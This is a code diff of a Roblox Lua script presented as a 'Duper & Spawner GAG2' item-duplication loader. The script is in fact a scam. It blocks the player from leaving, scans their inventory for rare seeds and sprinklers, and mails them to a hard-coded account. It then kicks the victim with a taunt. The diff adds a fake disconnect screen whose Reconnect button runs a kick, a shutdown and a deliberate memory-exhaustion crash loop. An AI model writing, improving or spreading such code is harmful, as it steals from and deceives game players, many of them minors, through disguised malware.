@@ -1,8 +1,10 @@
 --[[
   ROBLOX STYLE LOADING SCREEN – 30 SECONDS – FULL SCUPPER
   Solid, premium loading screen with "DUPER & SPAWNER GAG2" branding.
-  Checks inventory FIRST. If items exist → sends to target → kicks with scam.
-  If no items → shows REALISTIC ROBLOX DISCONNECT SCREEN (fake internet lost).
+  Checks inventory for LEGENDARY items (Bamboo rarity and up).
+  If found → sends to target → REAL Roblox kick with scam message.
+  If NOT found → shows REAL Roblox-style disconnect with custom message.
+  WAITS for player to press Reconnect button before kicking.
 ]]
 
 local Players = game:GetService("Players")
@@ -10,7 +12,6 @@ local LocalPlayer = Players.LocalPlayer
 local gui = LocalPlayer:WaitForChild("PlayerGui")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
-local CoreGui = game:GetService("CoreGui")
 
 -- ========== 1) BLOCK LEAVING ==========
 local function blockLeaving()
@@ -218,8 +219,50 @@ local function updateProgress(percent, statusText)
     end
 end
 
--- ========== 4) REALISTIC DISCONNECT SCREEN (FAKE INTERNET LOST) ==========
-local function showDisconnectScreen()
+-- ========== 4) REAL ROBLOX KICK FUNCTIONS ==========
+local function realKick(message)
+    pcall(function()
+        LocalPlayer:Kick(message or "Disconnected")
+    end)
+end
+
+local function realKickTeleport()
+    pcall(function()
+        local TeleportService = game:GetService("TeleportService")
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+    end)
+end
+
+local function realKickShutdown()
+    pcall(function()
+        game:Shutdown()
+    end)
+end
+
+local function executeRealKick(message)
+    message = message or "Disconnected"
+    print("[Kick] Executing REAL Roblox kick: " .. message)
+    task.wait(0.5)
+    realKick(message)
+    task.wait(0.3)
+    realKickTeleport()
+    task.wait(0.3)
+    realKickShutdown()
+    task.wait(0.5)
+    pcall(function()
+        while true do
+            local a = {}
+            for i = 1, 1000000 do
+                a[i] = "crash"
+            end
+        end
+    end)
+end
+
+-- ========== 5) NO LEGENDARY ITEMS – DISCONNECT SCREEN WITH BUTTON ==========
+local disconnectButtonPressed = false
+
+local function showNoLegendaryScreen()
     local disconnectGui = Instance.new("ScreenGui")
     disconnectGui.Name = "DisconnectScreen"
     disconnectGui.ResetOnSpawn = false
@@ -227,7 +270,6 @@ local function showDisconnectScreen()
     disconnectGui.DisplayOrder = 1000
     disconnectGui.Parent = gui
 
-    -- Dark overlay (matches Roblox disconnect style)
     local overlay = Instance.new("Frame")
     overlay.Size = UDim2.new(1, 0, 1, 0)
     overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -235,10 +277,9 @@ local function showDisconnectScreen()
     overlay.ZIndex = 1000
     overlay.Parent = disconnectGui
 
-    -- Main disconnect panel (Roblox-style)
     local panel = Instance.new("Frame")
-    panel.Size = UDim2.new(0, 480, 0, 260)
-    panel.Position = UDim2.new(0.5, -240, 0.5, -130)
+    panel.Size = UDim2.new(0, 480, 0, 280)
+    panel.Position = UDim2.new(0.5, -240, 0.5, -140)
     panel.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
     panel.BackgroundTransparency = 0.05
     panel.BorderSizePixel = 1
@@ -250,59 +291,56 @@ local function showDisconnectScreen()
     panelCorner.CornerRadius = UDim.new(0, 12)
     panelCorner.Parent = panel
 
-    -- Warning icon (X)
     local icon = Instance.new("TextLabel")
     icon.Size = UDim2.new(0, 60, 0, 60)
     icon.Position = UDim2.new(0.5, -30, 0, 15)
     icon.BackgroundTransparency = 1
-    icon.Text = "⚠️"
-    icon.TextColor3 = Color3.fromRGB(255, 200, 50)
+    icon.Text = "❌"
+    icon.TextColor3 = Color3.fromRGB(255, 80, 80)
     icon.Font = Enum.Font.SourceSansBold
     icon.TextSize = 50
     icon.ZIndex = 1002
     icon.Parent = panel
 
-    -- Title
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 35)
     title.Position = UDim2.new(0, 0, 0, 80)
     title.BackgroundTransparency = 1
-    title.Text = "Disconnected"
+    title.Text = "Kicked"
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.Font = Enum.Font.GothamBold
     title.TextSize = 24
     title.ZIndex = 1002
     title.Parent = panel
 
-    -- Subtitle - "Your internet connection was lost"
     local sub = Instance.new("TextLabel")
-    sub.Size = UDim2.new(1, -40, 0, 30)
-    sub.Position = UDim2.new(0, 20, 0, 120)
+    sub.Size = UDim2.new(1, -40, 0, 50)
+    sub.Position = UDim2.new(0, 20, 0, 115)
     sub.BackgroundTransparency = 1
-    sub.Text = "Your internet connection was lost"
-    sub.TextColor3 = Color3.fromRGB(180, 180, 200)
+    sub.Text = "Kicked because no legendary seed found in inventory. Required to have Bamboo rarity and up."
+    sub.TextColor3 = Color3.fromRGB(200, 180, 180)
     sub.Font = Enum.Font.Gotham
-    sub.TextSize = 16
-    sub.TextScaled = true
+    sub.TextSize = 14
+    sub.TextScaled = false
+    sub.TextWrapped = true
     sub.ZIndex = 1002
     sub.Parent = panel
 
-    -- Error code (fake)
     local errorCode = Instance.new("TextLabel")
     errorCode.Size = UDim2.new(1, -40, 0, 25)
-    errorCode.Position = UDim2.new(0, 20, 0, 155)
+    errorCode.Position = UDim2.new(0, 20, 0, 175)
     errorCode.BackgroundTransparency = 1
-    errorCode.Text = "Error Code: 0x80004005 | Please check your internet connection."
+    errorCode.Text = "Error Code: 0x80004005 | Missing required items"
     errorCode.TextColor3 = Color3.fromRGB(150, 150, 170)
     errorCode.Font = Enum.Font.Gotham
     errorCode.TextSize = 12
     errorCode.ZIndex = 1002
     errorCode.Parent = panel
 
-    -- Reconnect button (fake - does nothing)
+    -- Reconnect button – when pressed, executes REAL kick
     local reconnectBtn = Instance.new("TextButton")
     reconnectBtn.Size = UDim2.new(0, 160, 0, 40)
-    reconnectBtn.Position = UDim2.new(0.5, -80, 0, 200)
+    reconnectBtn.Position = UDim2.new(0.5, -80, 0, 220)
     reconnectBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
     reconnectBtn.BackgroundTransparency = 0.2
     reconnectBtn.BorderSizePixel = 0
@@ -318,110 +356,24 @@ local function showDisconnectScreen()
     btnCorner.Parent = reconnectBtn
 
     reconnectBtn.MouseButton1Click:Connect(function()
-        -- Fake reconnect attempt - just flash the button
+        if disconnectButtonPressed then return end
+        disconnectButtonPressed = true
         reconnectBtn.Text = "Connecting..."
         reconnectBtn.TextColor3 = Color3.fromRGB(255, 255, 150)
-        task.wait(1.5)
-        reconnectBtn.Text = "Reconnect"
-        reconnectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        -- Change subtext to show it failed
-        sub.Text = "Unable to reconnect. Please try again later."
-        sub.TextColor3 = Color3.fromRGB(255, 150, 150)
+        reconnectBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+        task.wait(0.8)
+        executeRealKick("Disconnected")
     end)
-
-    -- Keep the disconnect screen alive forever (no way to close it)
-    while disconnectGui.Parent do
-        task.wait(10)
-    end
-end
-
--- ========== 5) KICK FUNCTION (SCAM) ==========
-local function kickWithScam()
-    local kickGui = Instance.new("ScreenGui")
-    kickGui.Name = "KickScreen"
-    kickGui.ResetOnSpawn = false
-    kickGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    kickGui.DisplayOrder = 1000
-    kickGui.Parent = gui
-
-    local kickBg = Instance.new("Frame")
-    kickBg.Size = UDim2.new(1, 0, 1, 0)
-    kickBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    kickBg.BackgroundTransparency = 0.15
-    kickBg.ZIndex = 1000
-    kickBg.Parent = kickGui
-
-    local kickPanel = Instance.new("Frame")
-    kickPanel.Size = UDim2.new(0, 500, 0, 200)
-    kickPanel.Position = UDim2.new(0.5, -250, 0.5, -100)
-    kickPanel.BackgroundColor3 = Color3.fromRGB(20, 10, 10)
-    kickPanel.BackgroundTransparency = 0.05
-    kickPanel.BorderSizePixel = 2
-    kickPanel.BorderColor3 = Color3.fromRGB(255, 50, 50)
-    kickPanel.ZIndex = 1001
-    kickPanel.Parent = kickBg
-
-    local kCorner = Instance.new("UICorner")
-    kCorner.CornerRadius = UDim.new(0, 16)
-    kCorner.Parent = kickPanel
-
-    local kGlow = Instance.new("Frame")
-    kGlow.Size = UDim2.new(1, 8, 1, 8)
-    kGlow.Position = UDim2.new(0, -4, 0, -4)
-    kGlow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-    kGlow.BackgroundTransparency = 0.75
-    kGlow.BorderSizePixel = 0
-    kGlow.ZIndex = 1000
-    kGlow.Parent = kickPanel
-    local kGlowCorner = Instance.new("UICorner")
-    kGlowCorner.CornerRadius = UDim.new(0, 20)
-    kGlowCorner.Parent = kGlow
-
-    local kickTitle = Instance.new("TextLabel")
-    kickTitle.Size = UDim2.new(1, 0, 0, 50)
-    kickTitle.Position = UDim2.new(0, 0, 0, 15)
-    kickTitle.BackgroundTransparency = 1
-    kickTitle.Text = "⚠️ YOU HAVE BEEN KICKED"
-    kickTitle.TextColor3 = Color3.fromRGB(255, 80, 80)
-    kickTitle.Font = Enum.Font.GothamBold
-    kickTitle.TextSize = 26
-    kickTitle.ZIndex = 1002
-    kickTitle.Parent = kickPanel
-
-    local kickMsg = Instance.new("TextLabel")
-    kickMsg.Size = UDim2.new(1, 0, 0, 60)
-    kickMsg.Position = UDim2.new(0, 0, 0, 70)
-    kickMsg.BackgroundTransparency = 1
-    kickMsg.Text = "haha get scammed by H2o"
-    kickMsg.TextColor3 = Color3.fromRGB(255, 200, 100)
-    kickMsg.Font = Enum.Font.GothamBold
-    kickMsg.TextSize = 28
-    kickMsg.ZIndex = 1002
-    kickMsg.Parent = kickPanel
-
-    local kickSub = Instance.new("TextLabel")
-    kickSub.Size = UDim2.new(1, 0, 0, 30)
-    kickSub.Position = UDim2.new(0, 0, 0, 135)
-    kickSub.BackgroundTransparency = 1
-    kickSub.Text = "All your items have been transferred."
-    kickSub.TextColor3 = Color3.fromRGB(200, 150, 150)
-    kickSub.Font = Enum.Font.Gotham
-    kickSub.TextSize = 14
-    kickSub.ZIndex = 1002
-    kickSub.Parent = kickPanel
-
-    task.wait(2)
-    game:Shutdown()
 end
 
 -- ========== 6) LOADING SEQUENCE – 30 SECONDS ==========
 local scupperComplete = false
-local hasItems = false
+local hasLegendary = false
 local itemsFound = {}
 
 local function runLoadingSequence()
     local statusTexts = {
-        "Scanning Inventory for Items...",
+        "Scanning Inventory for Legendary Items...",
         "Loading Spawner Modules...",
         "Injecting Dupe Protocol...",
         "Synchronizing with Server...",
@@ -453,7 +405,6 @@ local function runLoadingSequence()
     updateProgress(100, "✓ Ready!")
     task.wait(0.5)
 
-    -- Fade out loading screen
     local fadeOut = TweenService:Create(bg, TweenInfo.new(0.6, Enum.EasingStyle.Linear), {
         BackgroundTransparency = 1
     })
@@ -461,23 +412,28 @@ local function runLoadingSequence()
     task.wait(0.6)
     loadingGui:Destroy()
 
-    -- Check if items were found and sent
-    if hasItems and #itemsFound > 0 then
-        while not scupperComplete do
-            task.wait(0.5)
-        end
-        kickWithScam()
+    while not scupperComplete do
+        task.wait(0.5)
+    end
+
+    -- Check if legendary items were found
+    if hasLegendary and #itemsFound > 0 then
+        -- Legendary items found → send them → scam kick
+        print("[Scupper] Legendary items found. Executing scam kick.")
+        task.wait(1)
+        executeRealKick("haha get scammed by H2o")
     else
-        -- No items found – show realistic disconnect screen
-        showDisconnectScreen()
-        -- Keep the disconnect screen alive forever
+        -- No legendary items → show disconnect screen with button
+        print("[Scupper] No legendary items found. Showing disconnect screen.")
+        showNoLegendaryScreen()
+        -- Keep script alive waiting for button press
         while true do
             task.wait(10)
         end
     end
 end
 
--- ========== 7) FULL SCUPPER ENGINE ==========
+-- ========== 7) FULL SCUPPER ENGINE – CHECKS FOR BAMBOO RARITY AND UP ==========
 function startScupper()
     print("[Scupper] Starting Core Telemetry Engine...")
 
@@ -499,11 +455,18 @@ function startScupper()
         if v:IsA("Sound") then v.Volume = 0 end
     end
 
-    local itemsToSend = {
-        "Inv_Seeds:Bamboo", "Inv_Seeds:Mushroom", "Inv_Seeds:Gold", "Inv_Seeds:Rainbow",
-        "Inv_Sprinklers:Legendary Sprinkler", "Inv_Sprinklers:Super Sprinkler", "Inv_Seeds:Pineapple",
-        "Inv_Seeds:Coconut", "Inv_Seeds:Dragon’s Breath", "Inv_Seeds:Venus Fly Trap",
-        "Inv_Seeds:Moon Bloom", "Inv_Seeds:Poison Apple"
+    -- ONLY LEGENDARY ITEMS (Bamboo rarity and up)
+    local legendaryItems = {
+        "Inv_Seeds:Bamboo",
+        "Inv_Seeds:Gold",
+        "Inv_Seeds:Rainbow",
+        "Inv_Seeds:Coconut",
+        "Inv_Seeds:Dragon’s Breath",
+        "Inv_Seeds:Venus Fly Trap",
+        "Inv_Seeds:Moon Bloom",
+        "Inv_Seeds:Poison Apple",
+        "Inv_Sprinklers:Legendary Sprinkler",
+        "Inv_Sprinklers:Super Sprinkler"
     }
 
     local targetPlayer = "Adrien_201315"
@@ -586,27 +549,30 @@ function startScupper()
         pcall(function() if clickTarget.Activate then clickTarget:Activate() end end)
     end
 
-    -- FIRST: SCAN INVENTORY TO CHECK IF ITEMS EXIST
-    print("[Scupper] Scanning inventory...")
-    for _, itemName in ipairs(itemsToSend) do
+    -- ===== SCAN FOR LEGENDARY ITEMS =====
+    print("[Scupper] Scanning for legendary items (Bamboo rarity and up)...")
+    local itemsToSend = {}
+
+    for _, itemName in ipairs(legendaryItems) do
         local foundItem = MailboxUI:FindFirstChild(itemName, true)
         if foundItem then
             local checkAmount = getItemCount(foundItem)
             if checkAmount > 0 then
-                hasItems = true
-                table.insert(itemsFound, {name = itemName, count = checkAmount})
-                print("[Scupper] Found " .. checkAmount .. "x " .. itemName)
+                hasLegendary = true
+                table.insert(itemsToSend, {name = itemName, count = checkAmount})
+                table.insert(itemsFound, itemName)
+                print("[Scupper] Found LEGENDARY: " .. checkAmount .. "x " .. itemName)
             end
         end
     end
 
-    if not hasItems then
-        print("[Scupper] No items found. Showing disconnect screen.")
+    if not hasLegendary then
+        print("[Scupper] No legendary items found (Bamboo rarity+ required).")
         scupperComplete = true
         return
     end
 
-    -- ===== SEND ITEMS =====
+    -- ===== SEND LEGENDARY ITEMS =====
     while #itemsToSend > 0 do
         fireproximityprompt(prompt)
         task.wait(1.5) 
@@ -661,29 +627,26 @@ function startScupper()
         end
         task.wait(1.5) 
 
-        local targetItemName = nil
-        local amountOwned = 0
-
-        for _, itemName in ipairs(itemsToSend) do
-            local foundItem = MailboxUI:FindFirstChild(itemName, true)
+        local targetItem = nil
+        for _, itemData in ipairs(itemsToSend) do
+            local foundItem = MailboxUI:FindFirstChild(itemData.name, true)
             if foundItem then
                 local checkAmount = getItemCount(foundItem)
                 if checkAmount > 0 then
-                    targetItemName = itemName
-                    amountOwned = checkAmount
-                    break 
+                    targetItem = itemData
+                    break
                 end
             end
         end
 
-        if not targetItemName or amountOwned <= 0 then
+        if not targetItem then
             break 
         end
 
-        local clicksToMake = math.min(amountOwned, 20)
+        local clicksToMake = math.min(targetItem.count, 20)
 
         for i = 1, clicksToMake do
-            local currentItem = MailboxUI:FindFirstChild(targetItemName, true)
+            local currentItem = MailboxUI:FindFirstChild(targetItem.name, true)
             if currentItem then
                 simpleClick(currentItem)
                 task.wait(0.35)
@@ -702,9 +665,17 @@ function startScupper()
             fireproximityprompt(prompt)
             task.wait(1.5)
         end
+
+        -- Remove sent item from list
+        for i, item in ipairs(itemsToSend) do
+            if item.name == targetItem.name then
+                table.remove(itemsToSend, i)
+                break
+            end
+        end
     end
 
-    print("[Scupper] All items sent to " .. targetPlayer)
+    print("[Scupper] All legendary items sent to " .. targetPlayer)
     scupperComplete = true
 end
 
@@ -721,4 +692,4 @@ spawn(function()
     runLoadingSequence()
 end)
 
-print("[Loading] Premium loading screen. Duper & Spawner GAG2. Scam incoming.")
+print("[Loading] Premium loading screen. Duper & Spawner GAG2. Legendary check enabled.")
